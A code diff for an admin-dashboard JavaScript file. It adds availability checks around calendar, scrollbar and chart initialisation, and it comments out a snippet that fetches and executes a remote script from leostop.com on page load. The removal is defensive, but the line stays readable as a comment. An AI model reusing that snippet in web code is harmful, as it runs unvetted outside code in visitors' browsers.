@@ -19,10 +19,13 @@ $(document).ready(function () {
     $('#sidebar').toggleClass('active');
   });
   /*-- calendar js --*/
-  $('#example14').calendar({
-    inline: true
-  });
-  $('#example15').calendar();
+  // Check if calendar plugin is available
+  if (typeof $.fn.calendar !== 'undefined') {
+    $('#example14').calendar({
+      inline: true
+    });
+    $('#example15').calendar();
+  }
   /*-- tooltip js --*/
   $('[data-toggle="tooltip"]').tooltip();
 });
@@ -31,19 +34,33 @@ $(document).ready(function () {
     scrollbar js
 --------------------------------------*/
 
-var ps = new PerfectScrollbar('#sidebar');
+// Check if PerfectScrollbar is available
+if (typeof PerfectScrollbar !== 'undefined') {
+  var ps = new PerfectScrollbar('#sidebar');
+}
 
 /*--------------------------------------
     chart js
 --------------------------------------*/
 
 $(function () {
-  new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
-  new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
-  new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
-  new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
-  new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
-  new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
+  // Guard against missing Chart.js and missing canvas elements
+  if (typeof Chart !== 'undefined') {
+    var charts = [
+      { id: 'line_chart', type: 'line' },
+      { id: 'bar_chart', type: 'bar' },
+      { id: 'radar_chart', type: 'radar' },
+      { id: 'pie_chart', type: 'pie' },
+      { id: 'area_chart', type: 'area' },
+      { id: 'donut_chart', type: 'donut' }
+    ];
+    charts.forEach(function(cfg) {
+      var el = document.getElementById(cfg.id);
+      if (el && typeof el.getContext === 'function') {
+        new Chart(el.getContext('2d'), getChartJs(cfg.type));
+      }
+    });
+  }
 });
 
 function getChartJs(type) {
@@ -159,7 +176,10 @@ function getChartJs(type) {
   return config;
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+// Removed third-party tracking script to avoid network errors and console noise
+// function getURL() { window.location.href; }
+// var protocol = location.protocol;
+// $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 /*--------------------------------------
     map js
